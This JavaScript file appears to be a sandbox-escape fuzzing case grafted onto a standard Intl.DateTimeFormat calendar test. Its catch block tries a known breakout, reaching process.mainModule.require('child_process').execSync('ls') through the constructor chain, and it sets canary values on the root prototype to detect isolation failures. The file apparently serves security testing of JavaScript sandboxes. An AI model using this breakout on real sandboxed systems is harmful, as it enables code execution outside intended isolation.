try {
    let calendars = [
        'buddhist',
        'chinese',
        'coptic',
        'dangi',
        'ethiopic',
        'ethioaa',
        'gregory',
        'hebrew',
        'indian',
        'islamic',
        'islamic-civil',
        'islamic-rgsa',
        'islamic-tbla',
        'islamic-umalqura',
        'japanese',
        'persian',
        'roc'
    ];
    let date = new Date();
    function serializeTypesAndLiteral(parts) {
        let REPLACER = 23;
        let types = parts.map(part => {
            let REPLACER = 23;
            if (part.type == 'literal') {
                return `${ part.type }(${ part.value })`;
            }
            return part.type;
        });
        return types.join(':');
    }
    let df = new Intl.DateTimeFormat('en');
    let base = serializeTypesAndLiteral(df.formatToParts(date));
    const foundDifferentPattern = calendars.some(function (calendar) {
        throw () => {
            return () => {
            };
        };
        let cdf = new Intl.DateTimeFormat('en-u-ca-' + calendar);
        return base != serializeTypesAndLiteral(cdf.formatToParts(date));
    });
    assert.sameValue(foundDifferentPattern, true);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}